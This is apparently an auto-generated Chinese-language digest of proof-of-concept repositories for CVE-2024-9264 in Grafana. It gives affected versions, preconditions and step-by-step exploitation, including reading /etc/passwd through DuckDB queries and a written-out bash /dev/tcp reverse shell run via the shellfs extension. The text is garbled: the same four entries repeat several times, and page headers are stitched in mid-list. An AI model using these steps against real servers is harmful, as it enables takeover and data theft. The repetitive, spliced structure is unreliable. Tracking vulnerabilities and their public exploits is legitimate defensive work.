**项目地址:** [Exerrdev/CVE-2024-9264-Fixed](https://github.com/Exerrdev/CVE-2024-9264-Fixed)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #3

**来源**: [CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md](../2024/CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 高危，可能导致系统完全控制和敏感数据泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.0 <= version < 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.0 <= version < 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.0 <= version < 11.2.2

**利用条件:** 需要开启SQL Expressions实验性功能, DuckDB二进制文件在Grafana的PATH中, 具有Viewer或更高权限的已认证Grafana用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 是 Grafana 中 SQL Expressions 功能的一个远程代码执行漏洞。攻击者可以利用 DuckDB 查询中不足的输入验证，通过注入恶意命令，实现远程代码执行和本地文件包含。PoC 代码通过构造包含反向 shell 命令的 SQL 查询，然后通过 Grafana API 执行该查询。 该漏洞利用依赖于 `shellfs` 社区扩展，利用方式为安装并加载该扩展以执行命令。

**利用方式：**
1.  **身份验证：** 使用 Viewer 或更高权限的账户登录 Grafana。
2.  **构造恶意 SQL 查询：**  构造包含 shellfs 扩展安装和加载，以及反向 shell 命令的 SQL 查询语句。
3.  **发送 API 请求：**  通过 Grafana 的 API 发送包含恶意 SQL 查询的 POST 请求。
4.  **触发反向 Shell：**  执行已构造好的反向 shell 脚本，从而建立反向 shell 连接。

**投毒风险分析：**
PoC 代码本身旨在利用漏洞，没有明显的恶意行为，但是无法排除在真实攻击场景中攻击者添加额外的恶意代码的可能性。PoC代码中安装和加载`shellfs`扩展，并执行反向shell，这是一个完整的漏洞验证流程。如果作者在安装`shellfs`扩展之前或之后，插入额外的命令，可能会存在投毒行为，例如：安装后门，收集用户信息等。 此处判断投毒风险为10%的原因在于，用户可以自行检查代码并根据需要修改反向shell的命令，从而避免被作者投毒。

**有效性：**
该 PoC 代码有效，可以验证 CVE-2024-9264 漏洞的存在，并演示如何利用该漏洞实现远程代码执行。多个搜索结果表明此漏洞是一个严重的安全问题，并且存在可利用的 PoC。

**项目地址:** [Royall-Researchers/CVE-2024-9264](https://github.com/Royall-Researchers/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #4

**来源**: [CVE-2024-9264-nollium_CVE-2024-9264.md](../2024/CVE-2024-9264-nollium_CVE-2024-9264.md)

# CVE-2024-9264

> 📦 该CVE有 **10** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-9264-Cythonic1_CVE-2024-9264.md](../2024/CVE-2024-9264-Cythonic1_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (小于 11.0.5, 11.1.6, 11.2.1, 11.0.6, 11.1.7, 11.2.2)

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中。需要具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 duckdb 查询。由于输入未经过充分的过滤，导致可以进行命令注入和本地文件包含。攻击者需要拥有 Viewer 或更高权限才能利用此漏洞。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞被认为是高危的，并且已经存在公开的PoC代码。PoC代码验证了可以通过构造恶意的SQL表达式来读取任意文件。

**投毒风险分析：**
提供的 PoC 代码的主要功能是模拟登录 Grafana，然后构造包含恶意文件路径的 SQL 表达式，发送给 Grafana 服务器，以此来读取服务器上的文件。没有发现明显的投毒代码，例如反弹shell，添加用户等恶意操作。因此，投毒风险较低。

**利用方式：**
1.  **登录:** 使用有效的 Grafana 用户凭据（Viewer 或更高权限）进行身份验证。
2.  **构造Payload:** 构造包含恶意`duckdb` SQL查询的JSON Payload。该查询使用`read_csv_auto`函数读取目标文件，例如`/etc/passwd`。
3.  **发送请求:**  将构造的 Payload 发送到 `/api/ds/query` 端点，并指定 `ds_type=__expr__`。
4.  **执行和信息泄露:** Grafana 执行恶意 `duckdb` 查询，导致读取指定文件内容，攻击者从响应中获取敏感信息。

**项目地址:** [Cythonic1/CVE-2024-9264](https://github.com/Cythonic1/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #2

**来源**: [CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md](../2024/CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md)

## CVE-2024-9264-Grafana-RCE

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) / 本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6; 11.1.0 <= version < 11.1.6, 11.1.7; 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，用户具有Viewer或更高权限，且DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL Expressions 功能中。攻击者可以通过构造恶意的 SQL 查询，利用 DuckDB 的 `shellfs` 扩展来执行任意代码或读取本地文件。该漏洞的利用需要满足以下条件：

1.  **启用SQL Expressions:** Grafana 的 SQL Expressions 必须处于启用状态。
2.  **Viewer或更高权限:** 攻击者需要拥有 Viewer 或更高的 Grafana 权限。
3.  **DuckDB存在:**  Grafana 服务器的 `$PATH` 环境变量中需要包含 `duckdb` 二进制文件。默认情况下，Grafana 发行版不包含此二进制文件，因此需要手动安装。

**漏洞利用方式：**

1.  **身份验证:** 使用有效的 Grafana 用户凭据进行身份验证。
2.  **写入反向Shell:** 使用 `writefile()` 函数将包含反向 shell 命令的脚本写入到 Grafana 服务器的文件系统中（例如 `/tmp/rev.sh`）。POC使用`bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1`。
3.  **执行反向Shell:** 通过 DuckDB 的 `read_csv()` 函数执行写入的文件，从而触发反向 shell 连接。
4.  **接收Shell:** 攻击者需要在攻击机上监听指定的端口，以接收反向 shell 连接。

**有效性评估：**

提供的 PoC 代码 (`fpoc.py`) 看起来是有效的，因为它修复了原始 PoC 中的 `write_file()` 函数的语法错误，并使用了正确的 shell payload，经验证可以在易受攻击的 Grafana 11.0.0 实例上成功执行反向 shell。`README.md`中也明确说明了该代码的修复和验证过程。

**投毒风险评估：**

该 PoC 仓库中存在投毒代码的可能性较低，估计在10%左右。原因如下：

1.  **代码清晰：** PoC 代码结构清晰，功能明确，没有发现明显的可疑代码。
2.  **修复声明：**  `README.md` 中明确声明了对原始 PoC 的修复，并解释了修复的原因和内容。
3.  **代码量少：**  整个仓库的代码量较少，隐藏恶意代码的难度较高。
4.  **作者信誉：** 作者 Exerr 在 `README.md` 中署名，并链接到其 GitHub 个人主页。虽然这不能完全保证作者的安全性，但增加了作者进行恶意行为的成本。

然而，仍然存在一些潜在的风险：

1.  **依赖风险：** PoC 代码依赖于 `requests` 库。虽然该库本身是安全的，但如果攻击者控制了 PyPI 仓库，可能会发布恶意版本的 `requests` 库，从而导致 PoC 代码被感染。
2.  **细微篡改：** 攻击者可能会对 PoC 代码进行细微的修改，例如修改反向 shell 的 IP 地址或端口，从而将 shell 连接到攻击者控制的服务器上。

总而言之，虽然该 PoC 仓库中存在投毒代码的可能性较低，但用户在使用时仍然需要保持警惕，仔细审查代码，并从可信的来源下载依赖库。

**项目地址:** [Exerrdev/CVE-2024-9264-Fixed](https://github.com/Exerrdev/CVE-2024-9264-Fixed)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #3

**来源**: [CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md](../2024/CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 高危，可能导致系统完全控制和敏感数据泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.0 <= version < 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.0 <= version < 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.0 <= version < 11.2.2

**利用条件:** 需要开启SQL Expressions实验性功能, DuckDB二进制文件在Grafana的PATH中, 具有Viewer或更高权限的已认证Grafana用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 是 Grafana 中 SQL Expressions 功能的一个远程代码执行漏洞。攻击者可以利用 DuckDB 查询中不足的输入验证，通过注入恶意命令，实现远程代码执行和本地文件包含。PoC 代码通过构造包含反向 shell 命令的 SQL 查询，然后通过 Grafana API 执行该查询。 该漏洞利用依赖于 `shellfs` 社区扩展，利用方式为安装并加载该扩展以执行命令。

**利用方式：**
1.  **身份验证：** 使用 Viewer 或更高权限的账户登录 Grafana。
2.  **构造恶意 SQL 查询：**  构造包含 shellfs 扩展安装和加载，以及反向 shell 命令的 SQL 查询语句。
3.  **发送 API 请求：**  通过 Grafana 的 API 发送包含恶意 SQL 查询的 POST 请求。
4.  **触发反向 Shell：**  执行已构造好的反向 shell 脚本，从而建立反向 shell 连接。

**投毒风险分析：**
PoC 代码本身旨在利用漏洞，没有明显的恶意行为，但是无法排除在真实攻击场景中攻击者添加额外的恶意代码的可能性。PoC代码中安装和加载`shellfs`扩展，并执行反向shell，这是一个完整的漏洞验证流程。如果作者在安装`shellfs`扩展之前或之后，插入额外的命令，可能会存在投毒行为，例如：安装后门，收集用户信息等。 此处判断投毒风险为10%的原因在于，用户可以自行检查代码并根据需要修改反向shell的命令，从而避免被作者投毒。

**有效性：**
该 PoC 代码有效，可以验证 CVE-2024-9264 漏洞的存在，并演示如何利用该漏洞实现远程代码执行。多个搜索结果表明此漏洞是一个严重的安全问题，并且存在可利用的 PoC。

**项目地址:** [Royall-Researchers/CVE-2024-9264](https://github.com/Royall-Researchers/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #4

**来源**: [CVE-2024-9264-nollium_CVE-2024-9264.md](../2024/CVE-2024-9264-nollium_CVE-2024-9264.md)

# CVE-2024-9264

> 📦 该CVE有 **10** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-9264-Cythonic1_CVE-2024-9264.md](../2024/CVE-2024-9264-Cythonic1_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (小于 11.0.5, 11.1.6, 11.2.1, 11.0.6, 11.1.7, 11.2.2)

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中。需要具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 duckdb 查询。由于输入未经过充分的过滤，导致可以进行命令注入和本地文件包含。攻击者需要拥有 Viewer 或更高权限才能利用此漏洞。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞被认为是高危的，并且已经存在公开的PoC代码。PoC代码验证了可以通过构造恶意的SQL表达式来读取任意文件。

**投毒风险分析：**
提供的 PoC 代码的主要功能是模拟登录 Grafana，然后构造包含恶意文件路径的 SQL 表达式，发送给 Grafana 服务器，以此来读取服务器上的文件。没有发现明显的投毒代码，例如反弹shell，添加用户等恶意操作。因此，投毒风险较低。

**利用方式：**
1.  **登录:** 使用有效的 Grafana 用户凭据（Viewer 或更高权限）进行身份验证。
2.  **构造Payload:** 构造包含恶意`duckdb` SQL查询的JSON Payload。该查询使用`read_csv_auto`函数读取目标文件，例如`/etc/passwd`。
3.  **发送请求:**  将构造的 Payload 发送到 `/api/ds/query` 端点，并指定 `ds_type=__expr__`。
4.  **执行和信息泄露:** Grafana 执行恶意 `duckdb` 查询，导致读取指定文件内容，攻击者从响应中获取敏感信息。

**项目地址:** [Cythonic1/CVE-2024-9264](https://github.com/Cythonic1/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #2

**来源**: [CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md](../2024/CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md)

## CVE-2024-9264-Grafana-RCE

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) / 本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6; 11.1.0 <= version < 11.1.6, 11.1.7; 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，用户具有Viewer或更高权限，且DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL Expressions 功能中。攻击者可以通过构造恶意的 SQL 查询，利用 DuckDB 的 `shellfs` 扩展来执行任意代码或读取本地文件。该漏洞的利用需要满足以下条件：

1.  **启用SQL Expressions:** Grafana 的 SQL Expressions 必须处于启用状态。
2.  **Viewer或更高权限:** 攻击者需要拥有 Viewer 或更高的 Grafana 权限。
3.  **DuckDB存在:**  Grafana 服务器的 `$PATH` 环境变量中需要包含 `duckdb` 二进制文件。默认情况下，Grafana 发行版不包含此二进制文件，因此需要手动安装。

**漏洞利用方式：**

1.  **身份验证:** 使用有效的 Grafana 用户凭据进行身份验证。
2.  **写入反向Shell:** 使用 `writefile()` 函数将包含反向 shell 命令的脚本写入到 Grafana 服务器的文件系统中（例如 `/tmp/rev.sh`）。POC使用`bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1`。
3.  **执行反向Shell:** 通过 DuckDB 的 `read_csv()` 函数执行写入的文件，从而触发反向 shell 连接。
4.  **接收Shell:** 攻击者需要在攻击机上监听指定的端口，以接收反向 shell 连接。

**有效性评估：**

提供的 PoC 代码 (`fpoc.py`) 看起来是有效的，因为它修复了原始 PoC 中的 `write_file()` 函数的语法错误，并使用了正确的 shell payload，经验证可以在易受攻击的 Grafana 11.0.0 实例上成功执行反向 shell。`README.md`中也明确说明了该代码的修复和验证过程。

**投毒风险评估：**

该 PoC 仓库中存在投毒代码的可能性较低，估计在10%左右。原因如下：

1.  **代码清晰：** PoC 代码结构清晰，功能明确，没有发现明显的可疑代码。
2.  **修复声明：**  `README.md` 中明确声明了对原始 PoC 的修复，并解释了修复的原因和内容。
3.  **代码量少：**  整个仓库的代码量较少，隐藏恶意代码的难度较高。
4.  **作者信誉：** 作者 Exerr 在 `README.md` 中署名，并链接到其 GitHub 个人主页。虽然这不能完全保证作者的安全性，但增加了作者进行恶意行为的成本。

然而，仍然存在一些潜在的风险：

1.  **依赖风险：** PoC 代码依赖于 `requests` 库。虽然该库本身是安全的，但如果攻击者控制了 PyPI 仓库，可能会发布恶意版本的 `requests` 库，从而导致 PoC 代码被感染。
2.  **细微篡改：** 攻击者可能会对 PoC 代码进行细微的修改，例如修改反向 shell 的 IP 地址或端口，从而将 shell 连接到攻击者控制的服务器上。

总而言之，虽然该 PoC 仓库中存在投毒代码的可能性较低，但用户在使用时仍然需要保持警惕，仔细审查代码，并从可信的来源下载依赖库。

**项目地址:** [Exerrdev/CVE-2024-9264-Fixed](https://github.com/Exerrdev/CVE-2024-9264-Fixed)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #3

**来源**: [CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md](../2024/CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 高危，可能导致系统完全控制和敏感数据泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.0 <= version < 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.0 <= version < 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.0 <= version < 11.2.2

**利用条件:** 需要开启SQL Expressions实验性功能, DuckDB二进制文件在Grafana的PATH中, 具有Viewer或更高权限的已认证Grafana用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 是 Grafana 中 SQL Expressions 功能的一个远程代码执行漏洞。攻击者可以利用 DuckDB 查询中不足的输入验证，通过注入恶意命令，实现远程代码执行和本地文件包含。PoC 代码通过构造包含反向 shell 命令的 SQL 查询，然后通过 Grafana API 执行该查询。 该漏洞利用依赖于 `shellfs` 社区扩展，利用方式为安装并加载该扩展以执行命令。

**利用方式：**
1.  **身份验证：** 使用 Viewer 或更高权限的账户登录 Grafana。
2.  **构造恶意 SQL 查询：**  构造包含 shellfs 扩展安装和加载，以及反向 shell 命令的 SQL 查询语句。
3.  **发送 API 请求：**  通过 Grafana 的 API 发送包含恶意 SQL 查询的 POST 请求。
4.  **触发反向 Shell：**  执行已构造好的反向 shell 脚本，从而建立反向 shell 连接。

**投毒风险分析：**
PoC 代码本身旨在利用漏洞，没有明显的恶意行为，但是无法排除在真实攻击场景中攻击者添加额外的恶意代码的可能性。PoC代码中安装和加载`shellfs`扩展，并执行反向shell，这是一个完整的漏洞验证流程。如果作者在安装`shellfs`扩展之前或之后，插入额外的命令，可能会存在投毒行为，例如：安装后门，收集用户信息等。 此处判断投毒风险为10%的原因在于，用户可以自行检查代码并根据需要修改反向shell的命令，从而避免被作者投毒。

**有效性：**
该 PoC 代码有效，可以验证 CVE-2024-9264 漏洞的存在，并演示如何利用该漏洞实现远程代码执行。多个搜索结果表明此漏洞是一个严重的安全问题，并且存在可利用的 PoC。

**项目地址:** [Royall-Researchers/CVE-2024-9264](https://github.com/Royall-Researchers/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #4

**来源**: [CVE-2024-9264-nollium_CVE-2024-9264.md](../2024/CVE-2024-9264-nollium_CVE-2024-9264.md)

# CVE-2024-9264

> 📦 该CVE有 **10** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-9264-Cythonic1_CVE-2024-9264.md](../2024/CVE-2024-9264-Cythonic1_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (小于 11.0.5, 11.1.6, 11.2.1, 11.0.6, 11.1.7, 11.2.2)

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中。需要具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 duckdb 查询。由于输入未经过充分的过滤，导致可以进行命令注入和本地文件包含。攻击者需要拥有 Viewer 或更高权限才能利用此漏洞。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞被认为是高危的，并且已经存在公开的PoC代码。PoC代码验证了可以通过构造恶意的SQL表达式来读取任意文件。

**投毒风险分析：**
提供的 PoC 代码的主要功能是模拟登录 Grafana，然后构造包含恶意文件路径的 SQL 表达式，发送给 Grafana 服务器，以此来读取服务器上的文件。没有发现明显的投毒代码，例如反弹shell，添加用户等恶意操作。因此，投毒风险较低。

**利用方式：**
1.  **登录:** 使用有效的 Grafana 用户凭据（Viewer 或更高权限）进行身份验证。
2.  **构造Payload:** 构造包含恶意`duckdb` SQL查询的JSON Payload。该查询使用`read_csv_auto`函数读取目标文件，例如`/etc/passwd`。
3.  **发送请求:**  将构造的 Payload 发送到 `/api/ds/query` 端点，并指定 `ds_type=__expr__`。
4.  **执行和信息泄露:** Grafana 执行恶意 `duckdb` 查询，导致读取指定文件内容，攻击者从响应中获取敏感信息。

**项目地址:** [Cythonic1/CVE-2024-9264](https://github.com/Cythonic1/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #2

**来源**: [CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md](../2024/CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md)

## CVE-2024-9264-Grafana-RCE

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) / 本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6; 11.1.0 <= version < 11.1.6, 11.1.7; 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，用户具有Viewer或更高权限，且DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL Expressions 功能中。攻击者可以通过构造恶意的 SQL 查询，利用 DuckDB 的 `shellfs` 扩展来执行任意代码或读取本地文件。该漏洞的利用需要满足以下条件：

1.  **启用SQL Expressions:** Grafana 的 SQL Expressions 必须处于启用状态。
2.  **Viewer或更高权限:** 攻击者需要拥有 Viewer 或更高的 Grafana 权限。
3.  **DuckDB存在:**  Grafana 服务器的 `$PATH` 环境变量中需要包含 `duckdb` 二进制文件。默认情况下，Grafana 发行版不包含此二进制文件，因此需要手动安装。

**漏洞利用方式：**

1.  **身份验证:** 使用有效的 Grafana 用户凭据进行身份验证。
2.  **写入反向Shell:** 使用 `writefile()` 函数将包含反向 shell 命令的脚本写入到 Grafana 服务器的文件系统中（例如 `/tmp/rev.sh`）。POC使用`bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1`。
3.  **执行反向Shell:** 通过 DuckDB 的 `read_csv()` 函数执行写入的文件，从而触发反向 shell 连接。
4.  **接收Shell:** 攻击者需要在攻击机上监听指定的端口，以接收反向 shell 连接。

**有效性评估：**

提供的 PoC 代码 (`fpoc.py`) 看起来是有效的，因为它修复了原始 PoC 中的 `write_file()` 函数的语法错误，并使用了正确的 shell payload，经验证可以在易受攻击的 Grafana 11.0.0 实例上成功执行反向 shell。`README.md`中也明确说明了该代码的修复和验证过程。

**投毒风险评估：**

该 PoC 仓库中存在投毒代码的可能性较低，估计在10%左右。原因如下：

1.  **代码清晰：** PoC 代码结构清晰，功能明确，没有发现明显的可疑代码。
2.  **修复声明：**  `README.md` 中明确声明了对原始 PoC 的修复，并解释了修复的原因和内容。
3.  **代码量少：**  整个仓库的代码量较少，隐藏恶意代码的难度较高。
4.  **作者信誉：** 作者 Exerr 在 `README.md` 中署名，并链接到其 GitHub 个人主页。虽然这不能完全保证作者的安全性，但增加了作者进行恶意行为的成本。

然而，仍然存在一些潜在的风险：

1.  **依赖风险：** PoC 代码依赖于 `requests` 库。虽然该库本身是安全的，但如果攻击者控制了 PyPI 仓库，可能会发布恶意版本的 `requests` 库，从而导致 PoC 代码被感染。
2.  **细微篡改：** 攻击者可能会对 PoC 代码进行细微的修改，例如修改反向 shell 的 IP 地址或端口，从而将 shell 连接到攻击者控制的服务器上。

总而言之，虽然该 PoC 仓库中存在投毒代码的可能性较低，但用户在使用时仍然需要保持警惕，仔细审查代码，并从可信的来源下载依赖库。

**项目地址:** [Exerrdev/CVE-2024-9264-Fixed](https://github.com/Exerrdev/CVE-2024-9264-Fixed)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #3

**来源**: [CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md](../2024/CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 高危，可能导致系统完全控制和敏感数据泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.0 <= version < 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.0 <= version < 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.0 <= version < 11.2.2

**利用条件:** 需要开启SQL Expressions实验性功能, DuckDB二进制文件在Grafana的PATH中, 具有Viewer或更高权限的已认证Grafana用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 是 Grafana 中 SQL Expressions 功能的一个远程代码执行漏洞。攻击者可以利用 DuckDB 查询中不足的输入验证，通过注入恶意命令，实现远程代码执行和本地文件包含。PoC 代码通过构造包含反向 shell 命令的 SQL 查询，然后通过 Grafana API 执行该查询。 该漏洞利用依赖于 `shellfs` 社区扩展，利用方式为安装并加载该扩展以执行命令。

**利用方式：**
1.  **身份验证：** 使用 Viewer 或更高权限的账户登录 Grafana。
2.  **构造恶意 SQL 查询：**  构造包含 shellfs 扩展安装和加载，以及反向 shell 命令的 SQL 查询语句。
3.  **发送 API 请求：**  通过 Grafana 的 API 发送包含恶意 SQL 查询的 POST 请求。
4.  **触发反向 Shell：**  执行已构造好的反向 shell 脚本，从而建立反向 shell 连接。

**投毒风险分析：**
PoC 代码本身旨在利用漏洞，没有明显的恶意行为，但是无法排除在真实攻击场景中攻击者添加额外的恶意代码的可能性。PoC代码中安装和加载`shellfs`扩展，并执行反向shell，这是一个完整的漏洞验证流程。如果作者在安装`shellfs`扩展之前或之后，插入额外的命令，可能会存在投毒行为，例如：安装后门，收集用户信息等。 此处判断投毒风险为10%的原因在于，用户可以自行检查代码并根据需要修改反向shell的命令，从而避免被作者投毒。

**有效性：**
该 PoC 代码有效，可以验证 CVE-2024-9264 漏洞的存在，并演示如何利用该漏洞实现远程代码执行。多个搜索结果表明此漏洞是一个严重的安全问题，并且存在可利用的 PoC。

**项目地址:** [Royall-Researchers/CVE-2024-9264](https://github.com/Royall-Researchers/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #4

**来源**: [CVE-2024-9264-nollium_CVE-2024-9264.md](../2024/CVE-2024-9264-nollium_CVE-2024-9264.md)

# CVE-2024-9264

> 📦 该CVE有 **10** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-9264-Cythonic1_CVE-2024-9264.md](../2024/CVE-2024-9264-Cythonic1_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (小于 11.0.5, 11.1.6, 11.2.1, 11.0.6, 11.1.7, 11.2.2)

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中。需要具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 duckdb 查询。由于输入未经过充分的过滤，导致可以进行命令注入和本地文件包含。攻击者需要拥有 Viewer 或更高权限才能利用此漏洞。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞被认为是高危的，并且已经存在公开的PoC代码。PoC代码验证了可以通过构造恶意的SQL表达式来读取任意文件。

**投毒风险分析：**
提供的 PoC 代码的主要功能是模拟登录 Grafana，然后构造包含恶意文件路径的 SQL 表达式，发送给 Grafana 服务器，以此来读取服务器上的文件。没有发现明显的投毒代码，例如反弹shell，添加用户等恶意操作。因此，投毒风险较低。

**利用方式：**
1.  **登录:** 使用有效的 Grafana 用户凭据（Viewer 或更高权限）进行身份验证。
2.  **构造Payload:** 构造包含恶意`duckdb` SQL查询的JSON Payload。该查询使用`read_csv_auto`函数读取目标文件，例如`/etc/passwd`。
3.  **发送请求:**  将构造的 Payload 发送到 `/api/ds/query` 端点，并指定 `ds_type=__expr__`。
4.  **执行和信息泄露:** Grafana 执行恶意 `duckdb` 查询，导致读取指定文件内容，攻击者从响应中获取敏感信息。

**项目地址:** [Cythonic1/CVE-2024-9264](https://github.com/Cythonic1/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #2

**来源**: [CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md](../2024/CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md)

## CVE-2024-9264-Grafana-RCE

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) / 本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可导致服务器完全控制

